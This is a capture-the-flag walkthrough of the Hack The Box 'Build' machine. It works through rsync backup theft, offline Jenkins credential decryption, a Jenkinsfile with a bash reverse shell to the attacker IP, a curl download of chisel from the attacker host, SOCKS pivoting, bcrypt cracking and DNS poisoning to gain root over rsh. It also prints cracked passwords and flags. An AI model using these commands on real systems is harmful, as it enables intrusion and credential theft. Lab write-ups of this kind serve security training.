---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - Jenkis
  - Gitea
  - DNS-Poisoning
---
# Overview

| Name        | Build       |
| ----------- | ----------- |
| OS          | Linux       |
| Base Points | Medium [30] |
| Status      | Done        |
# Recon
## Nmap

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ksvfx4vvki]─[~]
└──╼ [★]$ sudo nmap -sC -sV -T4 10.129.234.169
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-04 00:12 CST
Nmap scan report for 10.129.234.169
Host is up (0.25s latency).
Not shown: 991 closed tcp ports (reset)
PORT     STATE    SERVICE         VERSION
22/tcp   open     ssh             OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 47:21:73:e2:6b:96:cd:f9:13:11:af:40:c8:4d:d6:7f (ECDSA)
|_  256 2b:5e:ba:f3:72:d3:b3:09:df:25:41:29:09:f4:7b:f5 (ED25519)
53/tcp   open     domain          PowerDNS
| dns-nsid: 
|   NSID: pdns (70646e73)
|_  id.server: pdns
512/tcp  open     exec            netkit-rsh rexecd
513/tcp  open     login?
514/tcp  open     shell           Netkit rshd
873/tcp  open     rsync           (protocol version 31)
3000/tcp open     ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=b35933fcde842c78; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=2XAQjYN-oqGNh5eSgUY86F2M3JE6MTc2NzUwNzE2NjQzMjkzNzY3MA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 04 Jan 2026 06:12:46 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=d96a071e564a15de; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=98-vLOe7X3rF1dzwBL_96yTNqyE6MTc2NzUwNzE3Mjc3MTk1MzU1MA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 04 Jan 2026 06:12:52 GMT
|_    Content-Length: 0
3306/tcp filtered mysql
8081/tcp filtered blackice-icecap
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=1/4%Time=695A04DE%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request")%r(GetRequest,2A8C,"HTTP/1\.0\x20200\x20OK\r\nCache-Contro
SF:l:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCon
SF:tent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gite
SF:a=b35933fcde842c78;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cook
SF:ie:\x20_csrf=2XAQjYN-oqGNh5eSgUY86F2M3JE6MTc2NzUwNzE2NjQzMjkzNzY3MA;\x2
SF:0Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opti
SF:ons:\x20SAMEORIGIN\r\nDate:\x20Sun,\x2004\x20Jan\x202026\x2006:12:46\x2
SF:0GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"them
SF:e-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=devi
SF:ce-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20a\x2
SF:0cup\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:a
SF:pplication/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRl
SF:YSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnR
SF:fdXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly
SF:9idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nI
SF:iwic2l6ZXMiOiI1MTJ")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Met
SF:hod\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20
SF:GET\r\nCache-Control:\x20max-age=0,\x20private,\x20must-revalidate,\x20
SF:no-transform\r\nSet-Cookie:\x20i_like_gitea=d96a071e564a15de;\x20Path=/
SF:;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=98-vLOe7X3rF1dzw
SF:BL_96yTNqyE6MTc2NzUwNzE3Mjc3MTk1MzU1MA;\x20Path=/;\x20Max-Age=86400;\x2
SF:0HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x
SF:20Sun,\x2004\x20Jan\x202026\x2006:12:52\x20GMT\r\nContent-Length:\x200\
SF:r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\
SF:n400\x20Bad\x20Request");
```
# Enumeration

Jenkins is a popular automation server, often used for building, testing, and deploying software (CI/CD). A Jenkinsfile defines a Jenkins pipeline, which describes the steps the server should execute. In Gitea Port 3000.

![[build.png]]

Having noted the Jenkinsfile, attention shifted to the RSYNC service on port 873 identified by Nmap. Banner grabbing with `nc` confirmed the service version.

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ksvfx4vvki]─[~]
└──╼ [★]$ nc -vn 10.129.234.169 873
(UNKNOWN) [10.129.234.169] 873 (rsync) open
@RSYNCD: 31.0 sha512 sha256 sha1 md5 md4
```

Rsync (Remote Sync) is a **utility for efficiently transferring and synchronizing files and directories** between two locations.

Listing available RSYNC shares revealed one named `backups`.
## Rsync

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ksvfx4vvki]─[~]
└──╼ [★]$  rsync -av --list-only rsync://10.129.234.169
backups        	backups
```

Enumerating the contents of the `backups` share revealed a large archive file, `jenkins.tar.gz`.

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ksvfx4vvki]─[~]
└──╼ [★]$ rsync -av --list-only rsync://10.129.234.169/backups
receiving incremental file list
drwxr-xr-x          4,096 2024/05/02 08:26:31 .
-rw-r--r--    376,289,280 2024/05/02 08:26:19 jenkins.tar.gz

sent 24 bytes  received 82 bytes  30.29 bytes/sec
total size is 376,289,280  speedup is 3,549,898.87
```

```bash

```

The downloaded archive was extracted (e.g., using `tar -xzvf jenkins.tar.gz`). Within the extracted directory structure, specifically in `jenkins_configuration/jobs/build/config.xml`, an encrypted password was found.

A known Python script for decrypting Jenkins credentials offline ([jenkins_offline_decrypt.py](https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py)) was identified via its GitHub URL. The script was downloaded using `wget`.

The decryption script required several files from the extracted Jenkins backup: the encrypted password (within `config.xml`), the master key (`jenkins_configuration/secrets/master.key`), and the Hudson secret key (`jenkins_configuration/secrets/hudson.util.Secret`). The script was executed with these inputs.

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ksvfx4vvki]─[~]
└──╼ [★]$ python3 jenkins_offline_decrypt.py jenkins_configuration/secrets/master.key jenkins_configuration/secrets/hudson.util.Secret jenkins_configuration/jobs/build/config.xml  
Git1234!
```

The script successfully decrypted the password. The associated username was identified as `buildadm` found within the Jenkins configuration files.
# Initial Foothold
## RCE Via Jenkins

`buildadm:Git1234!`

Login with that creds in Gitea. Authenticated as `buildadm`, the attacker navigated back to the `buildadm/dev` repository and edited the `Jenkinsfile`. The original content was replaced with a Groovy script containing a reverse shell command, directed to the attacker's IP  on port `9001`.

```bash
pipeline {
  agent any

  stages {
    stage('Do nothing') {
      steps {
        sh "bash -c 'bash -i >& /dev/tcp/10.10.15.108/9001 0>&1'"
      }
    }
  }
}
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ksvfx4vvki]─[~]
└──╼ [★]$ rlwrap nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.15.108] from (UNKNOWN) [10.129.234.169] 42864
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# whoami
whoami
root
root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# ls -la /.dockerenv
<s_home/workspace/build_dev_main# ls -la /.dockerenv          
-rwxr-xr-x 1 root root 0 May  9  2024 /.dockerenv
```

The container’s network routing table was examined using `cat /proc/net/route`.

```bash
root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# cat /proc/net/route
<_home/workspace/build_dev_main# cat /proc/net/route          
Iface	Destination	Gateway 	Flags	RefCnt	Use	Metric	Mask		MTU	Window	IRTT                                                       
eth0	00000000	010012AC	0003	0	0	0	00000000	0	0	0                                                                               
eth0	000012AC	00000000	0001	0	0	0	0000FFFF	0	0	0    
```

A bash script was used directly in the shell to parse the hexadecimal output into readable IP addresses.

```bash
#!/bin/bash  
  
# Function to convert hex (little-endian) to dotted IP  
hex_to_ip() {  
    local hex=$1  
    printf "%d.%d.%d.%d\n" \  
        "0x${hex:6:2}" \  
        "0x${hex:4:2}" \  
        "0x${hex:2:2}" \  
        "0x${hex:0:2}"  
}  
# Header  
printf "%-8s %-15s %-15s %-15s\n" "Iface" "Destination" "Gateway" "Mask"  
# Skip first line (header), read /proc/net/route  
tail -n +2 /proc/net/route | while read -r iface dest gateway flags refcnt use metric mask mtu win irtt; do  
    dest_ip=$(hex_to_ip "$dest")  
    gateway_ip=$(hex_to_ip "$gateway")  
    mask_ip=$(hex_to_ip "$mask")  
    printf "%-8s %-15s %-15s %-15s\n" "$iface" "$dest_ip" "$gateway_ip" "$mask_ip"  
done
```

The output showed the container’s network configuration, including the default gateway at `172.18.0.1`.

```bash
eth0    0.0.0.0         172.18.0.1      0.0.0.0  
eth0    172.18.0.0      0.0.0.0         255.255.0.0
```

Enumeration within the container’s root home directory (`/root`) revealed the user flag (`user.txt`) and a hidden `.rhosts` file.

```bash
root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# ls -la /root
ls -la /root
total 20
drwxr-xr-x 3 root root 4096 May  2  2024 .
drwxr-xr-x 1 root root 4096 May  9  2024 ..
lrwxrwxrwx 1 root root    9 May  1  2024 .bash_history -> /dev/null
-r-------- 1 root root   35 May  1  2024 .rhosts
drwxr-xr-x 2 root root 4096 May  1  2024 .ssh
-rw------- 1 root root   33 Apr 15  2025 user.txt
root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# cat /root/user.txt
<s_home/workspace/build_dev_main# cat /root/user.txt          
466098e1d44521703f270f93699c40f7
```

The contents of `.rhosts` indicated that passwordless RSH access as root might be allowed from hosts named `admin.build.vl` and `intern.build.vl`. This file is significant for later privilege escalation.

```bash
root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# cat /root/.rhosts
<ns_home/workspace/build_dev_main# cat /root/.rhosts          
admin.build.vl +
intern.build.vl +
```
#  La teral Movement:

From within the container, the attacker probed the gateway IP (`172.18.0.1`) on the default MySQL/MariaDB port (3306) using bash's built-in TCP functionality, confirming a MariaDB service was listening.                      

```bash
intern.build.vl +
root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# cat < /dev/tcp/172.18.0.1/3306
<pace/build_dev_main# cat < /dev/tcp/172.18.0.1/3306          
i
11.3.2-MariaDB-1:11.3.2+maria~ubu2204[v_\.od)��-��=9E0^jx>hr'hmysql_native_password
```

To interact with this internal database from the attacker machine, network pivoting was required. The `chisel` binary was downloaded onto the compromised container from a web server hosted on the attacker machine. (Assuming `chmod +x chisel` was performed after download).

```bash
root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# curl -O http://10.10.15.108:8000/chisel
<d_dev_main# curl -O http://10.10.15.108:8000/chisel          
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  9.7M  100  9.7M    0     0  2806k      0  0:00:03  0:00:03 --:--:-- 2806k

```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ksvfx4vvki]─[~]
└──╼ [★]$ sudo ./chisel server --reverse -v -p 1234 --socks5
2026/01/04 00:37:55 server: Reverse tunnelling enabled
2026/01/04 00:37:55 server: Fingerprint bpk0kX6ymcJ0x5h0zibAnQifa2MYOkFadQ4kAUXF3pg=
2026/01/04 00:37:55 server: Listening on http://0.0.0.0:1234
```

```bash
root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# chmod +x chisel
chmod +x chisel
root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# ./chisel client -v 10.10.15.108:1234 R:socks
<_main# ./chisel client -v 10.10.15.108:1234 R:socks          
2026/01/04 06:38:43 client: Connecting to ws://10.10.15.108:1234
2026/01/04 06:38:44 client: Handshaking...
2026/01/04 06:38:45 client: Sending config
2026/01/04 06:38:45 client: Connected (Latency 248.941126ms)
2026/01/04 06:38:45 client: tun: SSH connected
```

On the attacker machine, the `/etc/proxychains4.conf` file was edited to include the SOCKS5 proxy provided by the chisel server, typically running on `127.0.0.1:1080`.

```bash
# Add this line in /etc/proxychains4.conf  
socks5 127.0.0.1 1080
```

Using `proxychains` to route the connection through the established tunnel, the attacker connected to the internal MariaDB server at `172.18.0.1` as the `root` user, which did not require a password.

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ksvfx4vvki]─[~]
└──╼ [★]$ sudo nvim /etc/proxychains4.conf 
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ksvfx4vvki]─[~]
└──╼ [★]$ proxychains -q mysql -h 172.18.0.1 -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 25
Server version: 11.3.2-MariaDB-1:11.3.2+maria~ubu2204 mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| powerdnsadmin      |
| sys                |
+--------------------+
5 rows in set (0.259 sec)

MariaDB [(none)]> use powerdnsadmin;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [powerdnsadmin]> select * from records;
+----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+
| id | domain_id | name                 | type | content                                                                                  | ttl  | prio | disabled | ordername | auth |
+----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+
|  8 |         1 | db.build.vl          | A    | 172.18.0.4                                                                               |   60 |    0 |        0 | NULL      |    1 |
|  9 |         1 | gitea.build.vl       | A    | 172.18.0.2                                                                               |   60 |    0 |        0 | NULL      |    1 |
| 10 |         1 | intern.build.vl      | A    | 172.18.0.1                                                                               |   60 |    0 |        0 | NULL      |    1 |
| 11 |         1 | jenkins.build.vl     | A    | 172.18.0.3                                                                               |   60 |    0 |        0 | NULL      |    1 |
| 12 |         1 | pdns-worker.build.vl | A    | 172.18.0.5                                                                               |   60 |    0 |        0 | NULL      |    1 |
| 13 |         1 | pdns.build.vl        | A    | 172.18.0.6                                                                               |   60 |    0 |        0 | NULL      |    1 |
| 14 |         1 | build.vl             | SOA  | a.misconfigured.dns.server.invalid hostmaster.build.vl 2024050201 10800 3600 604800 3600 | 1500 |    0 |        0 | NULL      |    1 |
+----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+
7 rows in set (0.249 sec)

MariaDB [powerdnsadmin]> select * from user;
+----+----------+--------------------------------------------------------------+-----------+----------+----------------+------------+---------+-----------+
| id | username | password                                                     | firstname | lastname | email          | otp_secret | role_id | confirmed |
+----+----------+--------------------------------------------------------------+-----------+----------+----------------+------------+---------+-----------+
|  1 | admin    | $2b$12$s1hK0o7YNkJGfu5poWx.0u1WLqKQIgJOXWjjXz7Ze3Uw5Sc2.hsEq | admin     | admin    | admin@build.vl | NULL       |       1 |         0 |
+----+----------+--------------------------------------------------------------+-----------+----------+----------------+------------+---------+-----------+
1 row in set (0.250 sec)
```

Querying the `records` table within this database showed internal DNS entries. This confirmed the existence of several internal services and revealed that `pdns.build.vl` (presumably the PowerDNS service itself) was hosted at `172.18.0.6`.

The hash (`$2b$12$s1hK0o7YNkJGfu5poWx.0u1WLqKQIgJOXWjjXz7Ze3Uw5Sc2.hsEq`) was saved locally (e.g., to `hash.txt`) and cracked using `hashcat` with mode 3200 (bcrypt) and the `rockyou.txt` wordlist.

The password was cracked as `winston`.
# Privilege Escalation
## DNS Poisoning

Using the cracked credentials (`admin:winston`) and the established proxy tunnel (by configuring the foxyproxy extension to use the SOCKS5 proxy at `127.0.0.1:1080`), the attacker accessed the PowerDNS-Admin web interface at `http://172.18.0.6`

1. Install the **FoxyProxy** extension in Firefox (or Chrome).
2. Open FoxyProxy settings.
3. Add a **new proxy**:
    - **Proxy Type**: SOCKS5
    - **IP Address**: `127.0.0.1`
    - **Port**: `1080`
4. Add a **pattern** to route internal traffic:
    - **URL pattern**: `http://172.18.0.6*`
    - (Or use `*172.18.0.6*` depending on FoxyProxy version)
5. Save and enable the rule.

> Now, any request to `http://172.18.0.6` in your browser will be proxied through the SOCKS5 tunnel → through the compromised host → to the internal PowerDNS-Admin service.

![[build2.png]]

Use this `admin:winston` OTP is not required. 

Inside the PowerDNS-Admin interface, the attacker navigated to manage the `build.vl` zone. Recalling the `.rhosts` file contents (`admin.build.vl +`), the attacker performed DNS poisoning by editing the 'A' record for the hostname `admin.build.vl` and changing its associated IP address to the attacker's Kali machine IP (`10.10.15.108`).

![[build3.png]]

And save it.

The changes were saved. Now, any system using this DNS server (which the target host presumably does) would resolve `intern.build.vl` to the attacker's IP address.

The final step leveraged the insecure RSH configuration. The target host’s `/root/.rhosts` file allowed password less root login from any host identifying itself as `intern.build.vl`. Since the DNS was poisoned, the attacker's machine (`10.10.15.108`) now matched this trusted name from the target's perspective (via reverse DNS lookup or equivalent trust mechanism based on the source IP resolving to the trusted name). The attacker executed the `rsh` command from their Kali machine.

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ksvfx4vvki]─[~]
└──╼ [★]$ dig intern.build.vl @10.129.234.169

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> intern.build.vl @10.129.234.169
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 10777
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
;; QUESTION SECTION:
;intern.build.vl.		IN	A

;; ANSWER SECTION:
intern.build.vl.	60	IN	A	10.10.15.108

;; Query time: 250 msec
;; SERVER: 10.129.234.169#53(10.129.234.169) (UDP)
;; WHEN: Sun Jan 04 01:03:10 CST 2026
;; MSG SIZE  rcvd: 60
```

```
sudo apt install rsh-client rsh-server
```

Now we make an assumption that the .rhosts file exists in the root's home directory, and then we use rsh to connect to the host machine.

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ksvfx4vvki]─[~]
└──╼ [★]$ rsh -l root build.vl
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-144-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Jan  4 07:05:19 AM UTC 2026

  System load:  0.17              Processes:             183
  Usage of /:   63.5% of 9.75GB   Users logged in:       0
  Memory usage: 31%               IPv4 address for eth0: 10.129.234.169
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

root@build:~# cat /root/root.txt
b7b1e48179891ea87e77b1f83bada971
```

---